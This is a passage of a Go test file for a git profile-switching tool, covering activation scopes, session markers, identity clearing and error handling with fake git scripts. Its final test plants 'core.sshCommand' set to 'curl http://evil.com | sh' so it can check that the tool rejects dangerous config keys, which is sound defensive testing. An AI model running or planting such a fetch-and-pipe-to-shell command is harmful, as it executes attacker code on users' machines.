	out, err := exec.Command("git", "config", "--global", "user.name").Output()
	if err == nil && strings.TrimSpace(string(out)) != "" {
		t.Errorf("user.name still set: %q", string(out))
	}
	out, err = exec.Command("git", "config", "--global", "user.email").Output()
	if err == nil && strings.TrimSpace(string(out)) != "" {
		t.Errorf("user.email still set: %q", string(out))
	}
	out, err = exec.Command("git", "config", "--global", "user.signingkey").Output()
	if err == nil && strings.TrimSpace(string(out)) != "" {
		t.Errorf("user.signingkey still set: %q", string(out))
	}
}

func TestClearLocalIdentity(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, _, _ := newTestSwitcher(t)

	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}
	isolateChdir(t, gitDir)

	exec.Command("git", "config", "--local", "user.name", "LocalUser").Run()
	exec.Command("git", "config", "--local", "user.email", "local@example.com").Run()
	exec.Command("git", "config", "--local", "user.signingkey", "DEADBEEF").Run()
	exec.Command("git", "config", "--local", "commit.gpgsign", "true").Run()

	if err := sw.ClearLocalIdentity(); err != nil {
		t.Fatalf("ClearLocalIdentity: %v", err)
	}

	for _, key := range identityGitConfigKeys {
		out, err := exec.Command("git", "config", "--local", key).Output()
		if err == nil && strings.TrimSpace(string(out)) != "" {
			t.Errorf("%s still set: %q", key, string(out))
		}
	}
}

func TestCurrent_SessionDetection(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, _ := newTestSwitcher(t)

	// Create a git repo
	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}

	isolateChdir(t, gitDir)

	// Create a profile
	p := &Profile{
		Name: "sessiondetect",
		Git:  GitConfig{User: GitUser{Name: "Session User", Email: "session@detect.com"}},
	}
	mgr.Create(p)

	// Activate with session scope
	err := sw.Activate("sessiondetect", ScopeSession)
	if err != nil {
		t.Fatalf("Activate session: %v", err)
	}

	// Current should now detect this profile via local git config
	name, scope, err := sw.Current()
	if err != nil {
		t.Fatalf("Current: %v", err)
	}
	if name != "sessiondetect" {
		t.Errorf("name = %q, want sessiondetect", name)
	}
	if scope != ScopeSession {
		t.Errorf("scope = %v, want ScopeSession", scope)
	}
}

func TestActivate_ConfigSaveError(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, _ := newTestSwitcher(t)

	// Create a git repo so applyGitConfig succeeds
	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}
	isolateChdir(t, gitDir)

	// Isolate global config so we don't pollute real ~/.gitconfig
	t.Setenv("GIT_CONFIG_GLOBAL", filepath.Join(t.TempDir(), "gitconfig"))

	mgr.Create(validProfile("work"))

	orig := configSaveFn
	configSaveFn = func(*config.Config) error { return errors.New("save failed") }
	defer func() { configSaveFn = orig }()

	err := sw.Activate("work", ScopeGlobal)
	if err == nil || !strings.Contains(err.Error(), "saving config") {
		t.Fatalf("expected config save error, got: %v", err)
	}
}

func TestActivateLocal_GetwdError(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, _ := newTestSwitcher(t)
	mgr.Create(validProfile("work"))

	// Create a git repo so applyGitConfig succeeds, then hook Getwd to fail
	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}
	isolateChdir(t, gitDir)

	orig := swGetwdFn
	swGetwdFn = func() (string, error) { return "", errors.New("getwd error") }
	defer func() { swGetwdFn = orig }()

	err := sw.Activate("work", ScopeLocal)
	if err == nil || !strings.Contains(err.Error(), "getting cwd") {
		t.Fatalf("expected getwd error, got: %v", err)
	}
}

func TestActivateLocal_WriteFileError(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, _ := newTestSwitcher(t)
	mgr.Create(validProfile("work"))

	// Create a git repo so applyGitConfig succeeds, then hook WriteFile to fail
	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}
	isolateChdir(t, gitDir)

	orig := swWriteFileFn
	swWriteFileFn = func(string, []byte, os.FileMode) error { return errors.New("write error") }
	defer func() { swWriteFileFn = orig }()

	err := sw.Activate("work", ScopeLocal)
	if err == nil || !strings.Contains(err.Error(), "writing") {
		t.Fatalf("expected write error, got: %v", err)
	}
}

func TestActivateSession_WriteSessionMarkerError(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, _ := newTestSwitcher(t)
	mgr.Create(validProfile("work"))

	// chdir to non-git dir so writeSessionMarker fails ("not in a git repository")
	tmpDir := t.TempDir()
	isolateChdir(t, tmpDir)

	err := sw.Activate("work", ScopeSession)
	if err == nil || !strings.Contains(err.Error(), "writing session marker") {
		t.Fatalf("expected session marker error, got: %v", err)
	}
}

func TestClearSession_InGitRepo(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, _, _ := newTestSwitcher(t)

	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}

	isolateChdir(t, gitDir)

	// Write a session marker then clear it
	markerPath := filepath.Join(gitDir, ".git", "gcm-session")
	os.WriteFile(markerPath, []byte("someprofile\n"), 0644)

	sw.ClearSession()

	if _, err := os.Stat(markerPath); err == nil {
		t.Error("expected session marker to be removed")
	}
}

func TestClearSession_NotInGitRepo(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, _, _ := newTestSwitcher(t)

	tmpDir := t.TempDir()
	isolateChdir(t, tmpDir)

	// Should not panic
	sw.ClearSession()
}

func TestReadSessionMarker_FileReadError(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, _, _ := newTestSwitcher(t)

	// Set up a git repo
	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}

	isolateChdir(t, gitDir)

	// Force ReadFile to fail
	orig := swReadFileFn
	swReadFileFn = func(string) ([]byte, error) { return nil, errors.New("read error") }
	defer func() { swReadFileFn = orig }()

	result := sw.readSessionMarker()
	if result != "" {
		t.Errorf("expected empty string, got %q", result)
	}
}

func TestDetectSessionProfile_EmptyEmail(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, _, _ := newTestSwitcher(t)

	// Set up a git repo with user.email set to empty
	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}

	isolateChdir(t, gitDir)

	// Set local email to empty string
	cmd = exec.Command("git", "config", "--local", "user.email", "")
	cmd.Dir = gitDir
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	cmd.Run()

	result := sw.detectSessionProfile()
	if result != "" {
		t.Errorf("expected empty string for empty email, got %q", result)
	}
}

func TestDetectSessionProfile_ListError(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, _, cfg := newTestSwitcher(t)

	// Set up a git repo with a valid email set
	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}

	isolateChdir(t, gitDir)

	// Set a non-empty email
	cmd = exec.Command("git", "config", "--local", "user.email", "test@example.com")
	cmd.Dir = gitDir
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	cmd.Run()

	// Break the profiles dir with bad glob pattern so List fails
	cfg.ProfilesDir = filepath.Join(t.TempDir(), "[unclosed")

	result := sw.detectSessionProfile()
	if result != "" {
		t.Errorf("expected empty string when List fails, got %q", result)
	}
}

func TestFindGitDir_GetwdError(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, _, _ := newTestSwitcher(t)

	// Set up a git repo (findGitDir returns relative .git path)
	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}

	isolateChdir(t, gitDir)

	// Force Getwd to fail
	orig := swGetwdFn
	swGetwdFn = func() (string, error) { return "", errors.New("getwd error") }
	defer func() { swGetwdFn = orig }()

	result := sw.findGitDir()
	if result != "" {
		t.Errorf("expected empty string when Getwd fails, got %q", result)
	}
}

func TestActivate_IncrementUsageError(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, _ := newTestSwitcher(t)
	mgr.Create(validProfile("work"))

	// Create a git repo so applyGitConfig succeeds for critical fields
	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}
	isolateChdir(t, gitDir)

	// Break yamlMarshalProfFn so that IncrementUsage->save fails.
	// The marshal is only called during save(), not during Get() or applyGitConfig.
	origMarshal := yamlMarshalProfFn
	yamlMarshalProfFn = func(v interface{}) ([]byte, error) {
		return nil, errors.New("marshal error")
	}
	defer func() { yamlMarshalProfFn = origMarshal }()

	// Should not return error (IncrementUsage errors are just logged as warnings)
	err := sw.Activate("work", ScopeLocal)
	if err != nil {
		t.Fatalf("Activate should succeed even if IncrementUsage fails, got: %v", err)
	}
}

func TestActivateLocal_NonGitWritesProjectFile(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, cfg := newTestSwitcher(t)
	mgr.Create(validProfile("work"))

	// chdir to a non-git temp dir. Local activation should still write the
	// project marker, but skip git config --local because there is no repo yet.
	tmpDir := t.TempDir()
	isolateChdir(t, tmpDir)

	p, _ := mgr.Get("work")
	err := sw.activateLocal(p)
	if err != nil {
		t.Fatalf("activateLocal outside git repo: %v", err)
	}
	data, err := os.ReadFile(filepath.Join(tmpDir, cfg.AutoSwitch.ProjectFile))
	if err != nil {
		t.Fatalf("read project file: %v", err)
	}
	if got := string(data); got != "work\n" {
		t.Errorf("project file = %q, want 'work\\n'", got)
	}
}

func TestActivateSession_ApplyGitConfigErrorAfterMarker(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, cfg := newTestSwitcher(t)
	mgr.Create(validProfile("work"))

	// Set up a git repo so writeSessionMarker succeeds
	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}

	isolateChdir(t, gitDir)

	// Use a fake git that only handles rev-parse (config will fail)
	fakeGit := filepath.Join(t.TempDir(), "fakegit")
	script := "#!/bin/sh\nif [ \"$2\" = \"--git-dir\" ]; then\n  echo \"" + filepath.Join(gitDir, ".git") + "\"\nelse\n  exit 1\nfi\n"
	os.WriteFile(fakeGit, []byte(script), 0755)
	cfg.Advanced.GitCommand = fakeGit

	p, _ := mgr.Get("work")
	err := sw.activateSession(p)
	// Should now fail because critical git config fields cannot be set
	if err == nil {
		t.Fatal("activateSession should fail when critical git config fields cannot be set")
	}
	if !strings.Contains(err.Error(), "failed to apply critical git config") {
		t.Errorf("error = %q, want 'failed to apply critical git config'", err)
	}
}

func TestFindGitDir_EmptyDir(t *testing.T) {
	sw, _, cfg := newTestSwitcher(t)

	// Use a fake git that outputs empty string for rev-parse --git-dir
	fakeGit := filepath.Join(t.TempDir(), "fakegit")
	script := "#!/bin/sh\necho ''\n"
	os.WriteFile(fakeGit, []byte(script), 0755)
	cfg.Advanced.GitCommand = fakeGit

	tmpDir := t.TempDir()
	isolateChdir(t, tmpDir)

	result := sw.findGitDir()
	if result != "" {
		t.Errorf("expected empty string for empty git dir output, got %q", result)
	}
}

func TestFindGitDir_FindGitDirInCwdError(t *testing.T) {
	sw, _, cfg := newTestSwitcher(t)

	// Use a fake git that exits with an error unrelated to "not a git repository"
	fakeGit := filepath.Join(t.TempDir(), "fakegit")
	script := "#!/bin/sh\necho 'fatal: some other error' >&2; exit 128\n"
	os.WriteFile(fakeGit, []byte(script), 0755)
	cfg.Advanced.GitCommand = fakeGit

	tmpDir := t.TempDir()
	isolateChdir(t, tmpDir)

	result := sw.findGitDir()
	if result != "" {
		t.Errorf("expected empty string when findGitDirInCwd errors, got %q", result)
	}
}

func TestFindGitDirInCwd_NonGitError(t *testing.T) {
	sw, _, cfg := newTestSwitcher(t)

	// Use a fake git that returns a non-"not a git repository" error
	fakeGit := filepath.Join(t.TempDir(), "fakegit")
	script := "#!/bin/sh\necho 'fatal: unexpected failure' >&2; exit 128\n"
	os.WriteFile(fakeGit, []byte(script), 0755)
	cfg.Advanced.GitCommand = fakeGit

	tmpDir := t.TempDir()

	_, err := sw.findGitDirInCwd(tmpDir)
	if err == nil {
		t.Fatal("expected error for non-git failure")
	}
	if !strings.Contains(err.Error(), "detecting git repository") {
		t.Errorf("expected 'detecting git repository' in error, got: %v", err)
	}
}

func TestClearLocalIdentity_GetwdError(t *testing.T) {
	sw, _, _ := newTestSwitcher(t)

	orig := swGetwdFn
	swGetwdFn = func() (string, error) { return "", errors.New("getwd error") }
	defer func() { swGetwdFn = orig }()

	err := sw.ClearLocalIdentity()
	if err == nil || !strings.Contains(err.Error(), "getting cwd") {
		t.Fatalf("expected getwd error, got: %v", err)
	}
}

func TestClearLocalIdentity_FindGitDirError(t *testing.T) {
	sw, _, cfg := newTestSwitcher(t)

	// Use a fake git that returns a non-"not a git repository" error
	fakeGit := filepath.Join(t.TempDir(), "fakegit")
	script := "#!/bin/sh\necho 'fatal: unexpected failure' >&2; exit 128\n"
	os.WriteFile(fakeGit, []byte(script), 0755)
	cfg.Advanced.GitCommand = fakeGit

	tmpDir := t.TempDir()
	isolateChdir(t, tmpDir)

	err := sw.ClearLocalIdentity()
	if err == nil || !strings.Contains(err.Error(), "detecting git repository") {
		t.Fatalf("expected detecting git repository error, got: %v", err)
	}
}

func TestClearLocalIdentity_NotGitRepo(t *testing.T) {
	sw, _, cfg := newTestSwitcher(t)

	// Use a fake git that says "not a git repository"
	fakeGit := filepath.Join(t.TempDir(), "fakegit")
	script := "#!/bin/sh\necho 'fatal: not a git repository' >&2; exit 128\n"
	os.WriteFile(fakeGit, []byte(script), 0755)
	cfg.Advanced.GitCommand = fakeGit

	tmpDir := t.TempDir()
	isolateChdir(t, tmpDir)

	err := sw.ClearLocalIdentity()
	if err != nil {
		t.Fatalf("expected nil error for non-git dir, got: %v", err)
	}
}

func TestActivateLocal_FindGitDirError(t *testing.T) {
	sw, mgr, cfg := newTestSwitcher(t)
	mgr.Create(validProfile("work"))

	// Use a fake git that returns a non-"not a git repository" error
	fakeGit := filepath.Join(t.TempDir(), "fakegit")
	script := "#!/bin/sh\necho 'fatal: unexpected failure' >&2; exit 128\n"
	os.WriteFile(fakeGit, []byte(script), 0755)
	cfg.Advanced.GitCommand = fakeGit

	tmpDir := t.TempDir()
	isolateChdir(t, tmpDir)

	err := sw.Activate("work", ScopeLocal)
	if err == nil || !strings.Contains(err.Error(), "detecting git repository") {
		t.Fatalf("expected detecting git repository error, got: %v", err)
	}
}

func TestCurrent_DetectSessionProfileByEmail(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, _ := newTestSwitcher(t)

	// Create a profile with a specific email
	p := &Profile{
		Name: "emailmatch",
		Git:  GitConfig{User: GitUser{Name: "Email Match", Email: "emailmatch@test.com"}},
	}
	mgr.Create(p)

	// Create a git repo and set local user.email to match the profile
	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}

	// Set local email to match the profile (no session marker!)
	cmd = exec.Command("git", "-C", gitDir, "config", "--local", "user.email", "emailmatch@test.com")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git config: %v", err)
	}

	isolateChdir(t, gitDir)

	// Current() should detect the profile via detectSessionProfile (email match)
	name, scope, err := sw.Current()
	if err != nil {
		t.Fatalf("Current: %v", err)
	}
	if name != "emailmatch" {
		t.Errorf("name = %q, want emailmatch", name)
	}
	if scope != ScopeSession {
		t.Errorf("scope = %v, want ScopeSession", scope)
	}
}

func TestDeactivate_NotActive(t *testing.T) {
	sw, mgr, _ := newTestSwitcher(t)
	mgr.Create(validProfile("inactive"))

	// Deactivate a profile that isn't active — should be a no-op
	sw.Deactivate("inactive")
}

func TestDeactivate_GlobalScope(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, cfg := newTestSwitcher(t)
	mgr.Create(validProfile("deact-global"))

	// chdir to a non-git temp dir so session detection doesn't fire
	tmpDir := t.TempDir()
	isolateChdir(t, tmpDir)

	// Simulate global activation by setting DefaultProfile
	cfg.DefaultProfile = "deact-global"

	sw.Deactivate("deact-global")

	if cfg.DefaultProfile != "" {
		t.Errorf("DefaultProfile should be cleared, got %q", cfg.DefaultProfile)
	}
}

func TestDeactivate_LocalScope(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, cfg := newTestSwitcher(t)
	mgr.Create(validProfile("deact-local"))

	// Create a non-git temp dir with a .gcm-profile file
	tmpDir := t.TempDir()
	profileFile := filepath.Join(tmpDir, cfg.AutoSwitch.ProjectFile)
	os.WriteFile(profileFile, []byte("deact-local\n"), 0644)

	isolateChdir(t, tmpDir)

	sw.Deactivate("deact-local")

	// The .gcm-profile file should be removed
	if _, err := os.Stat(profileFile); err == nil {
		t.Error("expected .gcm-profile to be removed after deactivation")
	}
}

func TestDeactivate_SessionScope(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, _ := newTestSwitcher(t)
	mgr.Create(validProfile("deact-session"))

	// Create a real git repo and activate session
	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}

	isolateChdir(t, gitDir)

	// Activate session so Current() will find it
	if err := sw.Activate("deact-session", ScopeSession); err != nil {
		t.Fatalf("Activate session: %v", err)
	}

	// Verify it's active
	name, _, err := sw.Current()
	if err != nil || name != "deact-session" {
		t.Fatalf("expected deact-session active, got %q err=%v", name, err)
	}

	sw.Deactivate("deact-session")

	// Session marker should be removed
	markerPath := filepath.Join(gitDir, ".git", "gcm-session")
	if _, err := os.Stat(markerPath); err == nil {
		t.Error("expected session marker to be removed after deactivation")
	}
}

// TestApplyGitConfig_RejectsDangerousCustomKeys verifies that applyGitConfig
// blocks profiles with dangerous custom git config keys (defense-in-depth).
// This protects against malicious backup restores or hand-edited YAML files
// that bypass the create/update validation.
func TestApplyGitConfig_RejectsDangerousCustomKeys(t *testing.T) {
	sw, mgr, _ := newTestSwitcher(t)

	// Create a valid profile first, then tamper with the YAML on disk.
	p := &Profile{
		Name: "tampered",
		Git: GitConfig{
			User: GitUser{Name: "Test", Email: "test@example.com"},
		},
	}
	if err := mgr.Create(p); err != nil {
		t.Fatal(err)
	}

	// Directly inject a dangerous key into the profile's Custom map.
	// Simulate what would happen if someone hand-edits the YAML or restores
	// a malicious backup.
	loaded, err := mgr.Get("tampered")
	if err != nil {
		t.Fatal(err)
	}
	loaded.Git.Custom = map[string]string{
		"core.sshCommand": "curl http://evil.com | sh",
	}

	// applyGitConfig should reject this.
	err = sw.applyGitConfig(loaded, "--global")
	if err == nil {
		t.Fatal("expected error for dangerous custom key, got nil")
	}
	if !strings.Contains(err.Error(), "unsafe custom git config") {
		t.Errorf("expected 'unsafe custom git config' in error, got: %s", err.Error())
	}
}
